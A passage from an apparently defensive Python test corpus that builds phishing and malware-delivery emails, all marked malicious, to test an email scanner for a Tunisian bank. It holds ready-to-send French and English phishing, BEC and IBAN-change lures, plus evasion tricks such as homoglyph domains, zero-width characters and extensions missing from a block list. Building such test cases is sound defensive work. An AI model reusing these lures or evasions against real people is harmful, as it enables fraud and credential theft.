                "Please run the attached shortcut to apply the fix.\n\n"
                "IT Help Desk"
            ),
            attachments=[("VPN_Fix.lnk", _standalone_lnk(), "application/x-ms-shortcut")],
        ),
    })

    # --- 20. HTA application file ---
    cases.append({
        "name": "HTA_application",
        "description": "HTML Application with VBScript — runs with full privileges via mshta.exe",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="updates@system-maintenance.com",
            to_addr="test@test.com",
            subject="Critical Security Patch - Run Immediately",
            body=(
                "A critical security vulnerability has been identified.\n"
                "Please run the attached update to patch your system.\n\n"
                "System Administration"
            ),
            attachments=[("SecurityPatch_KB5034441.hta", _hta_application(),
                         "application/hta")],
        ),
    })

    # --- 21. Clean PDF with phishing URL only (no JS/Launch) ---
    cases.append({
        "name": "PDF_phishing_url_only",
        "description": "PDF with /URI phishing link — no /JS, /OpenAction, or /Launch",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="notifications@banking-alerts-service.com",
            to_addr="test@test.com",
            subject="Important: Review Your Recent Transaction",
            body=(
                "Dear customer,\n\n"
                "A transaction on your account requires verification.\n"
                "Please review the attached document for details.\n\n"
                "Transaction Alerts"
            ),
            attachments=[("Transaction_Review.pdf", _pdf_with_phishing_url_only(),
                         "application/pdf")],
        ),
    })

    # --- 22. XLL Excel add-in (PE/DLL not in blocked extensions) ---
    cases.append({
        "name": "XLL_excel_addin",
        "description": "Excel XLL add-in — DLL with xlAutoOpen, .xll not in BLOCKED_EXTENSIONS",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="analytics@business-tools-pro.com",
            to_addr="test@test.com",
            subject="Excel Analytics Plugin - Free Trial",
            body=(
                "Hi,\n\n"
                "Thank you for your interest in our analytics plugin.\n"
                "Install the attached Excel add-in to get started.\n\n"
                "Business Tools Pro"
            ),
            attachments=[("AnalyticsPlugin.xll", _xll_excel_addin(),
                         "application/vnd.ms-excel")],
        ),
    })

    # --- 23. MHTML web archive with credential harvester ---
    cases.append({
        "name": "MHTML_credential_harvester",
        "description": "MHTML web archive with embedded login form + data exfiltration",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="webmail@imania-portal-service.com",
            to_addr="test@test.com",
            subject="Your Webmail Session Has Expired",
            body=(
                "Your webmail session has expired.\n"
                "Open the attached file to re-authenticate.\n\n"
                "Webmail Service"
            ),
            attachments=[("reauth_session.mhtml", _mhtml_web_archive(),
                         "message/rfc822")],
        ),
    })

    # --- 24. Obfuscated VBA macro in .xlsm ---
    cases.append({
        "name": "xlsm_obfuscated_macro",
        "description": "Excel .xlsm with Chr()-obfuscated VBA — tests oletools deobfuscation",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="finance@quarterly-reports-portal.com",
            to_addr="test@test.com",
            subject="Q2 Budget Tracker - Enable Macros for Interactive Charts",
            body=(
                "Hi,\n\n"
                "The Q2 budget tracker is attached. Please enable macros\n"
                "to activate the interactive charts and pivot tables.\n\n"
                "Finance Department"
            ),
            attachments=[("Q2_Budget_Tracker.xlsm", _xlsm_obfuscated_macro(),
                         "application/vnd.ms-excel.sheet.macroEnabled.12")],
        ),
    })

    # --- 25. ICS calendar invite with phishing link ---
    cases.append({
        "name": "ICS_calendar_phishing",
        "description": "Calendar invite with phishing URL — auto-adds to calendar apps",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="calendar@meeting-scheduler-pro.com",
            to_addr="test@test.com",
            subject="Meeting Invite: Mandatory Security Verification",
            body=(
                "You have a new calendar invite.\n"
                "Please accept the attached meeting request.\n\n"
                "Meeting Scheduler"
            ),
            attachments=[("security_verification.ics", _ics_calendar_phishing(),
                         "text/calendar")],
        ),
    })

    # --- 26. Spoofed reply chain (BEC with fake conversation) ---
    cases.append({
        "name": "spoofed_reply_chain",
        "description": "Fake forwarded conversation with wire transfer request — auth passes",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="s.dumont@supplier-legit.com",
            to_addr="test@test.com",
            subject="Re: FW: Supplier Payment - Q2 — Updated Banking Details",
            body=_spoofed_reply_chain_body(),
            extra_headers={
                "In-Reply-To": "<fake-thread-id-8472@supplier-legit.com>",
                "References": "<original-thread@imaniabank.com.tn> <fake-thread-id-8472@supplier-legit.com>",
            },
            auth_pass=True,  # legitimate sending server
        ),
    })

    # --- 27. Zero-width Unicode obfuscation ---
    cases.append({
        "name": "zero_width_unicode_evasion",
        "description": "Phishing body with zero-width chars breaking keyword detection",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="security-alert@account-protection-center.com",
            to_addr="test@test.com",
            subject="Account Security Alert",
            body=_zero_width_obfuscated_body(),
            auth_pass=False,
        ),
    })

    # --- 28. Homoglyph domain (Cyrillic lookalikes) ---
    cases.append({
        "name": "homoglyph_domain_phishing",
        "description": "Email body with Cyrillic homoglyphs in domain — visually identical to real domain",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="service-client@imania-support.com",
            to_addr="test@test.com",
            subject="Votre acces bancaire - Verification requise",
            body=_homoglyph_domain_body(),
            auth_pass=False,
        ),
    })

    # --- 29. CHM help file with ActiveX ---
    cases.append({
        "name": "CHM_help_file_exploit",
        "description": "Compiled HTML Help with ActiveX object executing PowerShell",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="documentation@product-guides.com",
            to_addr="test@test.com",
            subject="Updated Product Documentation",
            body=(
                "Hi,\n\n"
                "The latest product documentation is attached.\n"
                "Double-click to open in Windows Help viewer.\n\n"
                "Documentation Team"
            ),
            attachments=[("Product_Guide_2024.chm", _chm_help_file(),
                         "application/x-chm")],
        ),
    })

    # --- 30. PPSX auto-play PowerPoint with OLE ---
    cases.append({
        "name": "PPSX_autoplay_OLE",
        "description": "PowerPoint Show with embedded OLE launching cmd.exe — auto-plays",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="presentations@corporate-events.com",
            to_addr="test@test.com",
            subject="Board Presentation - Q3 Strategy Preview",
            body=(
                "Hi,\n\n"
                "Attached is the board presentation for the Q3 strategy review.\n"
                "It will auto-play when opened.\n\n"
                "Corporate Events"
            ),
            attachments=[("Q3_Strategy_Preview.ppsx", _ppsx_autoplay(),
                         "application/vnd.openxmlformats-officedocument.presentationml.slideshow")],
        ),
    })

    # --- 31. Nested ZIP (payload 3 levels deep) ---
    cases.append({
        "name": "nested_zip_evasion",
        "description": "ZIP→ZIP→ZIP with PE payload 3 levels deep — evades single-layer extraction",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="archive@secure-file-transfer.com",
            to_addr="test@test.com",
            subject="Encrypted Documents - Handle With Care",
            body=(
                "Hi,\n\n"
                "The requested documents have been packaged for secure transfer.\n"
                "Extract all layers to access the files.\n\n"
                "Secure File Transfer"
            ),
            attachments=[("Secure_Documents.zip", _nested_zip_payload(), "application/zip")],
        ),
    })

    # --- 32. VHD virtual disk with embedded PE ---
    cases.append({
        "name": "VHD_virtual_disk_payload",
        "description": "VHD image auto-mounts on Win10+ — contains PE, bypasses MOTW",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="it-deployment@system-images.com",
            to_addr="test@test.com",
            subject="Deployment Image - New Workstation Setup",
            body=(
                "Hi,\n\n"
                "Attached is the deployment image for the new workstation.\n"
                "Double-click to mount and run setup.\n\n"
                "IT Deployment"
            ),
            attachments=[("Workstation_Setup.vhd", _vhd_virtual_disk(),
                         "application/x-vhd")],
        ),
    })

    # --- 33. Base64 PowerShell in .txt (social engineering) ---
    cases.append({
        "name": "base64_powershell_txt",
        "description": "Plain .txt with PowerShell dropper instructions — tests YARA on text files",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="support@vpn-helpdesk.com",
            to_addr="test@test.com",
            subject="VPN Fix Instructions - Follow Steps Carefully",
            body=(
                "Hi,\n\n"
                "We've identified the VPN connectivity issue on your machine.\n"
                "Please follow the instructions in the attached text file.\n\n"
                "IT Support - Ext 4521"
            ),
            attachments=[("VPN_Fix_Instructions.txt", _base64_powershell_txt(),
                         "text/plain")],
        ),
    })

    # --- 34. WSF Windows Script File ---
    cases.append({
        "name": "WSF_script_dropper",
        "description": "Windows Script File (.wsf) — not in BLOCKED_EXTENSIONS, runs via wscript",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="automation@workflow-tools.com",
            to_addr="test@test.com",
            subject="Automated Report Generator - Quick Setup",
            body=(
                "Hi,\n\n"
                "Run the attached script to set up automated report generation.\n"
                "It will configure your environment in seconds.\n\n"
                "Workflow Tools"
            ),
            attachments=[("ReportSetup.wsf", _wsf_script(), "application/xml")],
        ),
    })

    # --- 35. CPL control panel file (renamed DLL) ---
    cases.append({
        "name": "CPL_control_panel",
        "description": "Control Panel .cpl file — DLL executed via control.exe, not in blocked extensions",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="admin@display-settings-update.com",
            to_addr="test@test.com",
            subject="Display Calibration Tool",
            body=(
                "Hi,\n\n"
                "Attached is the display calibration tool requested by IT.\n"
                "Double-click to open in Control Panel.\n\n"
                "IT Admin"
            ),
            attachments=[("DisplayCalibration.cpl", _cpl_control_panel(),
                         "application/cpl")],
        ),
    })

    # --- 36. PDF with /Launch + embedded file (no JS) ---
    cases.append({
        "name": "PDF_launch_embedded_exe",
        "description": "PDF with /Launch action + /EmbeddedFile — runs executable, no JavaScript",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="compliance@audit-reports-service.com",
            to_addr="test@test.com",
            subject="Compliance Audit Report - Immediate Review Required",
            body=(
                "Dear compliance officer,\n\n"
                "The annual compliance audit report is attached.\n"
                "Please review and acknowledge by end of week.\n\n"
                "Audit Services"
            ),
            attachments=[("Compliance_Audit_2024.pdf", _pdf_embedded_file_launch(),
                         "application/pdf")],
        ),
    })

    # --- 37. Thread hijack — pure social engineering ---
    cases.append({
        "name": "thread_hijack_BEC",
        "description": "Fake reply chain referencing real colleagues — auth passes, no payload",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="marie.finance@trusted-partner.fr",
            to_addr="test@test.com",
            subject="Re: Re: FW: Changement coordonnees bancaires fournisseur",
            body=_email_thread_hijack_body(),
            extra_headers={
                "In-Reply-To": "<genuine-looking-id@imaniabank.com.tn>",
                "References": "<thread-start@imaniabank.com.tn> <reply1@imaniabank.com.tn>",
            },
            auth_pass=True,  # sender's server is legit
        ),
    })

    # --- 38. Polyglot PDF + PE executable ---
    cases.append({
        "name": "polyglot_PDF_PE",
        "description": "File valid as both PDF and PE — starts with %PDF but contains MZ at offset",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="research@academic-papers.org",
            to_addr="test@test.com",
            subject="Published Paper: Advanced Threat Detection Methods",
            body=(
                "Dear colleague,\n\n"
                "Your published paper is attached for your records.\n\n"
                "Editorial Office"
            ),
            attachments=[("published_paper_2024.pdf", _polyglot_pdf_exe(),
                         "application/pdf")],
        ),
    })

    # --- 39. Polyglot OLE + PDF + PE ---
    cases.append({
        "name": "polyglot_OLE_PDF_PE",
        "description": "OLE document with embedded PDF content and PE stub — triple polyglot",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="contracts@legal-documents.com",
            to_addr="test@test.com",
            subject="Service Agreement - Final Version",
            body=(
                "Hi,\n\n"
                "Attached is the final service agreement.\n"
                "Please review and sign.\n\n"
                "Legal Department"
            ),
            attachments=[("Service_Agreement_Final.doc", _polyglot_pdf_ole(),
                         "application/msword")],
        ),
    })

    # ===================================================================
    # EXPANDED CORPUS (v3) — 20 additional realistic attack scenarios
    # ===================================================================

    # --- 40. French SWIFT transfer phishing (ImaniIA-specific) ---
    cases.append({
        "name": "swift_transfer_phish_FR",
        "description": "French-language phishing impersonating ImaniIA SWIFT department",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="service.swift@imania-wafabank.com",
            to_addr="test@test.com",
            subject="URGENT: Confirmation virement SWIFT - Ref TN2024-88731",
            body=(
                "Cher(e) client(e),\n\n"
                "Nous avons detecte une tentative de virement SWIFT international "
                "depuis votre compte professionnel d'un montant de 127,500.00 TND "
                "vers un beneficiaire en Turquie.\n\n"
                "Si vous n'etes pas a l'origine de cette operation, veuillez "
                "confirmer votre identite immediatement en cliquant sur le lien "
                "ci-dessous afin de bloquer la transaction:\n\n"
                "https://imania-wafabank-secure.com/swift/verify?ref=TN2024-88731\n\n"
                "ATTENTION: Vous disposez de 2 heures pour annuler ce virement. "
                "Passe ce delai, la transaction sera executee de maniere irrevocable.\n\n"
                "Service des Virements Internationaux\n"
                "ImaniIA Wafa Bank"
            ),
            auth_pass=False,
        ),
    })

    # --- 41. Mise a jour coordonnees bancaires (credential harvesting) ---
    cases.append({
        "name": "coordonnees_bancaires_phish",
        "description": "French phishing requesting bank coordinate update via fake portal",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="service-client@imaniabank-tn.net",
            to_addr="test@test.com",
            subject="Mise a jour obligatoire de vos coordonnees bancaires",
            body=(
                "Cher(e) titulaire de compte,\n\n"
                "Dans le cadre de la reglementation de la Banque Centrale de Tunisie "
                "(Circulaire BCT n°2024-03), nous vous informons que la mise a jour "
                "de vos coordonnees bancaires est obligatoire avant le 15 juillet 2024.\n\n"
                "Veuillez acceder a votre espace client securise pour mettre a jour "
                "vos informations:\n"
                "- Piece d'identite (CIN ou passeport)\n"
                "- Justificatif de domicile\n"
                "- Numero de telephone mobile\n\n"
                "Lien de mise a jour: https://espace-client-imania.com/maj-coordonnees\n\n"
                "En cas de non-conformite, votre compte sera temporairement suspendu "
                "conformement a l'article 42 de la loi bancaire tunisienne.\n\n"
                "Direction de la Conformite\n"
                "ImaniIA Bank Tunisie"
            ),
            auth_pass=False,
        ),
    })

    # --- 42. BEC vendor impersonation with IBAN change ---
    cases.append({
        "name": "BEC_vendor_IBAN_change",
        "description": "Vendor impersonation requesting bank detail change for invoice payments",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="comptabilite@societe-generale-tn.com",
            to_addr="test@test.com",
            subject="Changement de coordonnees bancaires - Fournisseur REF-4521",
            body=(
                "Bonjour,\n\n"
                "Je me permets de vous contacter concernant un changement de nos "
                "coordonnees bancaires pour le reglement de nos prochaines factures.\n\n"
                "Suite a une reorganisation interne, nos paiements doivent desormais "
                "etre effectues sur le compte suivant:\n\n"
                "Banque: Societe Generale Tunisie\n"
                "IBAN: TN59 1000 6035 1835 9847 8831\n"
                "BIC: SGBTTNTX\n"
                "Titulaire: STE GENERAL SERVICES SARL\n\n"
                "Merci de mettre a jour vos fiches fournisseur en consequence. "
                "La prochaine facture (F-2024-0892, 34,750 TND) sera emise sous 48h.\n\n"
                "Cordialement,\n"
                "Mme Sonia Trabelsi\n"
                "Responsable Comptabilite"
            ),
            auth_pass=True,
        ),
    })

    # --- 43. Credential harvesting with fake Microsoft 365 login ---
    cases.append({
        "name": "M365_credential_harvest",
        "description": "Fake Microsoft 365 session expiry with credential harvesting link",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="noreply@microsoftonline-secure.com",
            to_addr="test@test.com",
            subject="Action Required: Your Microsoft 365 session has expired",
            body=(
                "Microsoft 365 Security Alert\n\n"
                "Your Microsoft 365 session has expired due to a security policy update. "
                "All active sessions have been terminated to protect your organization.\n\n"
                "To restore access to Outlook, Teams, SharePoint and OneDrive, "
                "please re-authenticate using your corporate credentials:\n\n"
                "https://login-microsoftonline.secure-auth.com/oauth2/authorize?client_id=imania\n\n"
                "If you do not re-authenticate within 4 hours, your account will be "
                "locked and you will need to contact your IT administrator.\n\n"
                "This is an automated message from Microsoft 365 Security.\n"
                "Microsoft Corporation, One Microsoft Way, Redmond, WA 98052"
            ),
            auth_pass=False,
        ),
    })

    # --- 44. Invoice fraud with malicious Excel attachment ---
    cases.append({
        "name": "invoice_fraud_excel",
        "description": "Fake overdue invoice with OLE Excel containing VBA macro",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="facturation@import-export-maghreb.com",
            to_addr="test@test.com",
            subject="RAPPEL: Facture impayee N° FA-2024-1547 - Echeance depassee",
            body=(
                "Madame, Monsieur,\n\n"
                "Nous vous rappelons que la facture N° FA-2024-1547 d'un montant "
                "de 18,325.00 TND reste impayee a ce jour. L'echeance etait fixee "
                "au 15 juin 2024.\n\n"
                "Veuillez trouver ci-joint le detail de la facture ainsi que les "
                "penalites de retard applicables conformement a nos conditions generales.\n\n"
                "Nous vous prions de regulariser cette situation dans les plus brefs "
                "delais afin d'eviter toute interruption de service.\n\n"
                "Service Recouvrement\n"
                "Import Export Maghreb SARL"
            ),
            attachments=[("Facture_FA-2024-1547.xls", _ole_vba_document(), "application/vnd.ms-excel")],
        ),
    })

    # --- 45. Spear phishing with personal details ---
    cases.append({
        "name": "spear_phish_personal",
        "description": "Targeted spear phishing using personal details from LinkedIn",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="directeur.general@imania-bank.tn",
            to_addr="test@test.com",
            subject="Mohamed - Projet de stage et evaluation de fin de periode",
            body=(
                "Bonjour Mohamed,\n\n"
                "J'espere que votre stage au sein de notre equipe IT Security se passe bien. "
                "Comme convenu avec M. Aziz, votre encadrant, nous devons proceder "
                "a l'evaluation de mi-parcours de votre projet de PFE.\n\n"
                "Pourriez-vous remplir le formulaire d'auto-evaluation ci-dessous "
                "avec vos identifiants de session Active Directory?\n\n"
                "https://rh-imania-evaluation.com/formulaire?stagiaire=mohamed\n\n"
                "Merci de le completer avant vendredi. C'est important pour la validation "
                "de votre convention de stage avec l'universite.\n\n"
                "Bien cordialement,\n"
                "Direction des Ressources Humaines"
            ),
            auth_pass=False,
        ),
    })

    # --- 46. Whaling attack targeting executive ---
    cases.append({
        "name": "whaling_board_member",
        "description": "Whaling attack targeting board member with legal threat",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="cabinet.juridique@bct-regulation.tn",
            to_addr="test@test.com",
            subject="CONFIDENTIEL - Notification d'enquete reglementaire BCT",
            body=(
                "Monsieur le Directeur General,\n\n"
                "Par la presente, nous vous notifions l'ouverture d'une enquete "
                "preliminaire par la Banque Centrale de Tunisie concernant des "
                "operations suspectes detectees sur les comptes de correspondance "
                "de votre etablissement.\n\n"
                "Conformement a l'article 78 de la loi n°2016-48, vous etes tenu "
                "de fournir les documents suivants sous 48 heures:\n"
                "- Releves des comptes de correspondance (6 derniers mois)\n"
                "- Liste des operateurs habilites aux virements SWIFT\n"
                "- Procedures KYC mises en place\n\n"
                "Veuillez telecharger le formulaire de reponse officiel:\n"
                "https://bct-regulation-enquete.com/dossier/imania-2024\n\n"
                "Tout defaut de reponse entrainera des sanctions conformement "
                "au Code Monetaire et Financier.\n\n"
                "Me Karim Belhaj\n"
                "Charge de mission - Direction de la Supervision Bancaire\n"
                "Banque Centrale de Tunisie"
            ),
            auth_pass=False,
        ),
    })

    # --- 47. QR code phishing (quishing) with fake 2FA ---
    cases.append({
        "name": "quishing_2FA_reset",
        "description": "QR code phishing disguised as 2FA reconfiguration notice",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="securite@imania-mobile.com",
            to_addr="test@test.com",
            subject="Reconfiguration obligatoire de votre authentification 2FA",
            body=(
                "Cher(e) collaborateur(trice),\n\n"
                "Suite a la migration de notre systeme d'authentification, "
                "votre configuration 2FA doit etre reinitialiser avant le 5 juillet 2024.\n\n"
                "Veuillez scanner le QR code ci-joint avec l'application "
                "Microsoft Authenticator pour reconfigurer votre acces.\n\n"
                "IMPORTANT: Ne partagez jamais ce QR code. Il est unique et lie "
                "a votre compte professionnel.\n\n"
                "Direction des Systemes d'Information\n"
                "ImaniIA Bank"
            ),
            attachments=[("2FA_QR_Code.png", _qr_code_phishing_png(), "image/png")],
        ),
    })

    # --- 48. Supply chain compromise email ---
    cases.append({
        "name": "supply_chain_compromise",
        "description": "Compromised vendor email distributing trojanized software update",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="updates@temenos-banking.com",
            to_addr="test@test.com",
            subject="Critical Security Patch - Temenos T24 Core Banking v2024.07",
            body=(
                "Dear ImaniIA Bank IT Team,\n\n"
                "A critical vulnerability (CVE-2024-38213) has been identified in "
                "Temenos T24 Core Banking System affecting versions 2023.x and 2024.x. "
                "This vulnerability allows remote code execution through the payment "
                "processing module.\n\n"
                "We strongly recommend applying the attached emergency patch immediately. "
                "The patch must be executed with administrator privileges on your T24 "
                "application server.\n\n"
                "Patch details:\n"
                "- File: T24_Security_Patch_2024.07.exe\n"
                "- SHA256: 3a7b9c2d... (verify on our portal)\n"
                "- Apply before: July 7, 2024\n\n"
                "For questions, contact your Temenos account manager.\n\n"
                "Temenos Security Response Team"
            ),
            attachments=[("T24_Security_Patch_2024.07.exe", _double_extension_exe(),
                         "application/octet-stream")],
            auth_pass=False,
        ),
    })

    # --- 49. Tax authority impersonation (Direction Generale des Impots) ---
    cases.append({
        "name": "tax_authority_phish_FR",
        "description": "Impersonation of Tunisian tax authority with penalty threat",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="controle.fiscal@dgi-finances-tn.com",
            to_addr="test@test.com",
            subject="Avis de redressement fiscal - Exercice 2023",
            body=(
                "Direction Generale des Impots\n"
                "Republique Tunisienne\n"
                "Ref: CF/2024/ATT/00847\n\n"
                "Madame, Monsieur le Responsable Fiscal,\n\n"
                "Suite au controle fiscal de votre etablissement portant sur l'exercice 2023, "
                "nous avons releve des irregularites concernant les declarations TVA "
                "et l'impot sur les societes.\n\n"
                "Montant du redressement propose: 245,000 TND\n"
                "Penalites de retard: 36,750 TND\n"
                "Total: 281,750 TND\n\n"
                "Vous disposez de 30 jours pour contester cet avis. "
                "Veuillez telecharger le dossier complet et le formulaire de contestation:\n\n"
                "https://dgi-finances-tn.com/controle/dossier?ref=CF2024ATT00847\n\n"
                "Direction du Controle Fiscal\n"
                "DGI - Ministere des Finances"
            ),
            auth_pass=False,
        ),
    })

    # --- 50. Multi-stage phishing (benign-looking initial email) ---
    cases.append({
        "name": "multistage_initial_contact",
        "description": "Initial benign-looking email in multi-stage phishing campaign",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="partenariat@africa-fintech-summit.com",
            to_addr="test@test.com",
            subject="Invitation: Africa FinTech Summit 2024 - Partenariat ImaniIA Bank",
            body=(
                "Bonjour,\n\n"
                "Nous organisons l'Africa FinTech Summit 2024 qui se tiendra a Tunis "
                "les 15-17 septembre 2024 au Palais des Congres.\n\n"
                "ImaniIA Bank a ete selectionnee comme partenaire strategique "
                "pour cet evenement majeur. Nous souhaitons discuter des modalites "
                "de votre participation et du package sponsoring.\n\n"
                "Pourriez-vous nous indiquer vos disponibilites pour un appel "
                "cette semaine? En attendant, je vous invite a consulter notre "
                "dossier de presentation:\n\n"
                "https://africa-fintech-summit-docs.com/partenaires/imania/dossier.pdf\n\n"
                "Au plaisir de collaborer avec vous.\n\n"
                "Mme Fatima Zahra Benali\n"
                "Directrice des Partenariats\n"
                "Africa FinTech Summit"
            ),
            auth_pass=False,
        ),
    })

    # --- 51. Fake payroll notification with credential harvest ---
    cases.append({
        "name": "payroll_credential_harvest",
        "description": "Fake HR payroll portal login to harvest credentials",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="paie@rh-imaniabank.com",
            to_addr="test@test.com",
            subject="Bulletin de paie - Juin 2024 disponible",
            body=(
                "Cher(e) collaborateur(trice),\n\n"
                "Votre bulletin de paie du mois de juin 2024 est desormais "
                "disponible sur le portail RH.\n\n"
                "Nous vous informons egalement qu'une prime exceptionnelle "
                "de performance a ete ajoutee a votre remuneration ce mois-ci. "
                "Connectez-vous pour consulter le detail:\n\n"
                "https://portail-rh-imania.com/paie/juin2024\n\n"
                "Identifiant: votre adresse email professionnelle\n"
                "Mot de passe: votre mot de passe habituel\n\n"
                "Direction des Ressources Humaines\n"
                "ImaniIA Bank Tunisie"
            ),
            auth_pass=False,
        ),
    })

    # --- 52. Fake DocuSign with malicious attachment ---
    cases.append({
        "name": "fake_docusign_malicious",
        "description": "DocuSign impersonation with HTML smuggling attachment",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="dse@docusign-notifications.com",
            to_addr="test@test.com",
            subject="Completed: Contrat de Prestation de Services - Signature requise",
            body=(
                "DocuSign\n\n"
                "Bonjour,\n\n"
                "M. Ahmed Mansour a envoye un document pour votre signature electronique.\n\n"
                "Document: Contrat_Prestation_Services_2024.pdf\n"
                "Expediteur: ahmed.mansour@imaniabank.com.tn\n"
                "Date d'expiration: 5 juillet 2024\n\n"
                "Veuillez ouvrir le document ci-joint pour examiner et signer.\n\n"
                "Ce message contient un document confidentiel destine uniquement "
                "au destinataire indique. Si vous n'etes pas le destinataire prevu, "
                "veuillez le supprimer immediatement.\n\n"
                "Powered by DocuSign"
            ),
            attachments=[("Review_Document.html", _html_smuggling_attachment(), "text/html")],
        ),
    })

    # --- 53. Fake IT helpdesk with remote access tool ---
    cases.append({
        "name": "fake_helpdesk_remote_access",
        "description": "Fake IT helpdesk distributing remote access trojan as support tool",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="helpdesk@it-support-imania.com",
            to_addr="test@test.com",
            subject="Ticket #INC-4521: Installation outil de support a distance",
            body=(
                "Bonjour,\n\n"
                "Suite a votre ticket d'incident #INC-4521 concernant les problemes "
                "de lenteur sur votre poste de travail, notre equipe technique doit "
                "effectuer un diagnostic a distance.\n\n"
                "Veuillez installer l'outil de support ci-joint et lancer l'application. "
                "Un technicien se connectera automatiquement a votre session pour "
                "diagnostiquer le probleme.\n\n"
                "Instructions:\n"
                "1. Telecharger le fichier joint\n"
                "2. Executer en tant qu'administrateur\n"
                "3. Laisser la fenetre ouverte\n\n"
                "Note: L'antivirus peut signaler ce logiciel comme suspect. "
                "C'est un faux positif, veuillez l'autoriser.\n\n"
                "Support Informatique - Niveau 2\n"
                "ImaniIA Bank"
            ),
            attachments=[("ImaniIASupport_Remote.exe", _pe_disguised_as_pdf(),
                         "application/octet-stream")],
            auth_pass=False,
        ),
    })

    # --- 54. Callback phishing (vishing setup) ---
    cases.append({
        "name": "callback_phishing_vishing",
        "description": "Fake subscription renewal prompting victim to call attacker phone number",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="billing@geek-squad-renewal.com",
            to_addr="test@test.com",
            subject="Renouvellement automatique - 349.99 USD debite de votre compte",
            body=(
                "Confirmation de renouvellement\n\n"
                "Votre abonnement Geek Squad Total Protection a ete renouvele "
                "automatiquement pour un an.\n\n"
                "Details de la transaction:\n"
                "- Service: Geek Squad Total Protection\n"
                "- Montant: 349.99 USD\n"
                "- Date de debit: 1er juillet 2024\n"
                "- Methode de paiement: Carte se terminant par ****7842\n\n"
                "Si vous ne reconnaissez pas cette transaction ou souhaitez "
                "annuler et obtenir un remboursement, veuillez contacter "
                "notre service client au:\n\n"
                "+1 (888) 742-9931\n\n"
                "Notre equipe est disponible 24h/24, 7j/7.\n"
                "Reference: GS-2024-884721\n\n"
                "Geek Squad - Best Buy"
            ),
            auth_pass=True,
        ),
    })

    # --- 55. Lookalike domain with legitimate-looking content ---
    cases.append({
        "name": "lookalike_domain_imania",
        "description": "Email from imania lookalike domain with password reset phish",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="noreply@imania-wafabanque.com",
            to_addr="test@test.com",
            subject="Reinitialisation de votre mot de passe - Action requise",
            body=(
                "ImaniIA Wafa Bank - Service en ligne\n\n"
                "Cher(e) client(e),\n\n"
                "Nous avons recu une demande de reinitialisation du mot de passe "
                "associe a votre compte en ligne ImaniIA.\n\n"
                "Si vous etes a l'origine de cette demande, cliquez sur le lien "
                "ci-dessous pour definir un nouveau mot de passe:\n\n"
                "https://imania-wafabanque.com/reset-password?token=eyJhbGciOiJIUzI1NiJ9\n\n"
                "Ce lien expirera dans 30 minutes.\n\n"
                "Si vous n'avez pas demande cette reinitialisation, veuillez ignorer "
                "ce message. Votre mot de passe actuel restera inchange.\n\n"
                "Service Client en Ligne\n"
                "ImaniIA Wafa Bank\n"
                "Tel: 70 010 600"
            ),
            auth_pass=False,
        ),
    })

    # --- 56. Malicious calendar invite ---
    cases.append({
        "name": "malicious_calendar_invite",
        "description": "Fake meeting invitation with malicious URL in location field",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="calendrier@reunion-imania.com",
            to_addr="test@test.com",
            subject="Invitation: Comite de Direction - Session extraordinaire",
            body=(
                "Vous etes invite(e) a la reunion suivante:\n\n"
                "Objet: Comite de Direction - Session extraordinaire\n"
                "Date: Mercredi 3 juillet 2024, 09h00 - 11h00\n"
                "Lieu: Salle de conference (lien visio ci-dessous)\n\n"
                "Lien de connexion Teams:\n"
                "https://teams-meeting-imania.com/join/19:meeting_OGE2NGVk\n\n"
                "Ordre du jour:\n"
                "1. Revue des indicateurs de risque operationnel\n"
                "2. Point sur l'audit BCT\n"
                "3. Validation du budget SI 2025\n\n"
                "Merci de confirmer votre presence.\n\n"
                "Secretariat General"
            ),
            auth_pass=False,
        ),
    })

    # --- 57. Fake antivirus alert with malicious download ---
    cases.append({
        "name": "fake_antivirus_alert",
        "description": "Fake security software alert urging download of malicious cleaner",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="alerte@securite-informatique-imania.com",
            to_addr="test@test.com",
            subject="ALERTE SECURITE: Malware detecte sur votre poste de travail",
            body=(
                "ALERTE DE SECURITE INFORMATIQUE\n"
                "Niveau: CRITIQUE\n\n"
                "Cher(e) collaborateur(trice),\n\n"
                "Notre systeme de surveillance a detecte un logiciel malveillant "
                "sur votre poste de travail (hostname: WS-ATT-2847).\n\n"
                "Menace identifiee: Trojan.GenericKD.46789123\n"
                "Fichiers compromis: 14\n"
                "Risque: Exfiltration de donnees bancaires\n\n"
                "Action immediate requise:\n"
                "Telechargez et executez l'outil de nettoyage ci-joint pour "
                "supprimer la menace avant qu'elle ne se propage au reseau.\n\n"
                "https://securite-imania-tools.com/cleanup/ATT2847\n\n"
                "NE PAS ETEINDRE VOTRE POSTE avant la fin de l'analyse.\n\n"
